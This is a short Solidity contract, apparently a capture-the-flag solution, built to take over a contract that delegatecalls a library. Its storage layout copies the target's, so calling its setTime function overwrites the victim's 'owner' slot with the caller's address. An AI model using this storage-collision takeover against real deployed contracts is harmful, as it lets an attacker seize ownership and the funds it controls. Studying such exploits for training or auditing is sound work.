// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

contract PreservationHack {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    // set the time for timezone 2
    function setTime(uint) public {
        owner = msg.sender;
    }
}
